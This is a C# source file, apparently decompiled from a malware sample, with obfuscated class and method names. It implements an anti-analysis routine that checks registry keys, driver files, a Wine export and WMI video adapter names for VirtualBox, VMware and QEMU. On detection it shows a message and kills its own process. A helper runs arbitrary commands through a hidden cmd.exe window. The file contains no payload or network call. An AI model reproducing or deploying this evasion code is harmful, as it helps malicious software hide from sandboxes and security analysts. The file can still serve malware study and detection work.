using System;
using System.Diagnostics;
using System.Management;
using System.Runtime.InteropServices;
using Microsoft.Win32;

namespace cq
{
	internal static class cC
	{
		[DllImport("kernel32.dll")]
		private static extern IntPtr GetModuleHandle(string lpModuleName);

		[DllImport("kernel32.dll")]
		private static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

		[DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
		private static extern uint GetFileAttributes(string lpFileName);

		internal static bool cG()
		{
			if (!cH())
			{
				return false;
			}
			return true;
		}

		private static bool cH()
		{
			if (!cI("HARDWARE\\DEVICEMAP\\Scsi\\Scsi Port 0\\Scsi Bus 0\\Target Id 0\\Logical Unit Id 0", "Identifier").ToUpper().Contains("VBOX") && !cI("HARDWARE\\Description\\System", "SystemBiosVersion").ToUpper().Contains("VBOX") && !cI("HARDWARE\\Description\\System", "VideoBiosVersion").ToUpper().Contains("VIRTUALBOX") && !(cI("SOFTWARE\\Oracle\\VirtualBox Guest Additions", "") == "noValueButYesKey") && GetFileAttributes("C:\\WINDOWS\\system32\\drivers\\VBoxMouse.sys") == uint.MaxValue && !cI("HARDWARE\\DEVICEMAP\\Scsi\\Scsi Port 0\\Scsi Bus 0\\Target Id 0\\Logical Unit Id 0", "Identifier").ToUpper().Contains("VMWARE") && !(cI("SOFTWARE\\VMware, Inc.\\VMware Tools", "") == "noValueButYesKey") && !cI("HARDWARE\\DEVICEMAP\\Scsi\\Scsi Port 1\\Scsi Bus 0\\Target Id 0\\Logical Unit Id 0", "Identifier").ToUpper().Contains("VMWARE") && !cI("HARDWARE\\DEVICEMAP\\Scsi\\Scsi Port 2\\Scsi Bus 0\\Target Id 0\\Logical Unit Id 0", "Identifier").ToUpper().Contains("VMWARE") && !cI("SYSTEM\\ControlSet001\\Services\\Disk\\Enum", "0").ToUpper().Contains("vmware".ToUpper()) && !cI("SYSTEM\\ControlSet001\\Control\\Class\\{4D36E968-E325-11CE-BFC1-08002BE10318}\\0000", "DriverDesc").ToUpper().Contains("VMWARE") && !cI("SYSTEM\\ControlSet001\\Control\\Class\\{4D36E968-E325-11CE-BFC1-08002BE10318}\\0000\\Settings", "Device Description").ToUpper().Contains("VMWARE") && !cI("SOFTWARE\\VMware, Inc.\\VMware Tools", "InstallPath").ToUpper().Contains("C:\\PROGRAM FILES\\VMWARE\\VMWARE TOOLS\\") && GetFileAttributes("C:\\WINDOWS\\system32\\drivers\\vmmouse.sys") == uint.MaxValue && GetFileAttributes("C:\\WINDOWS\\system32\\drivers\\vmhgfs.sys") == uint.MaxValue && !(GetProcAddress(GetModuleHandle("kernel32.dll"), "wine_get_unix_file_name") != (IntPtr)0) && !cI("HARDWARE\\DEVICEMAP\\Scsi\\Scsi Port 0\\Scsi Bus 0\\Target Id 0\\Logical Unit Id 0", "Identifier").ToUpper().Contains("QEMU") && !cI("HARDWARE\\Description\\System", "SystemBiosVersion").ToUpper().Contains("QEMU"))
			{
				foreach (ManagementObject item in new ManagementObjectSearcher(new ManagementScope("\\\\.\\ROOT\\cimv2"), new ObjectQuery("SELECT * FROM Win32_VideoController")).Get())
				{
					if (item["Description"].ToString() == "VM Additions S3 Trio32/64" || item["Description"].ToString() == "S3 Trio32/64" || item["Description"].ToString() == "VirtualBox Graphics Adapter" || item["Description"].ToString() == "VMware SVGA II" || item["Description"].ToString().ToUpper().Contains("VMWARE") || item["Description"].ToString() == "")
					{
						return true;
					}
				}
				return false;
			}
			return true;
		}

		private static string cI([In] string obj0, [In] string obj1)
		{
			RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(obj0, writable: false);
			if (registryKey != null)
			{
				object value = registryKey.GetValue(obj1, "noValueButYesKey");
				if (!(value is string) && registryKey.GetValueKind(obj1) != RegistryValueKind.String && registryKey.GetValueKind(obj1) != RegistryValueKind.ExpandString)
				{
					if (registryKey.GetValueKind(obj1) == RegistryValueKind.DWord)
					{
						return Convert.ToString((int)value);
					}
					if (registryKey.GetValueKind(obj1) == RegistryValueKind.QWord)
					{
						return Convert.ToString((long)value);
					}
					if (registryKey.GetValueKind(obj1) == RegistryValueKind.Binary)
					{
						return Convert.ToString((byte[])value);
					}
					if (registryKey.GetValueKind(obj1) == RegistryValueKind.MultiString)
					{
						return string.Join("", (string[])value);
					}
					return "noValueButYesKey";
				}
				return value.ToString();
			}
			return "noKey";
		}

		internal static void cz(string A_0)
		{
			Process.Start(new ProcessStartInfo("cmd.exe", "/c " + A_0)
			{
				CreateNoWindow = true,
				UseShellExecute = false
			});
		}

		private static void Initialize()
		{
			if (cG())
			{
				cz("START CMD /C \"ECHO VirtualMachine Detected ! && PAUSE\" ");
				Process.GetCurrentProcess().Kill();
			}
		}
	}
}
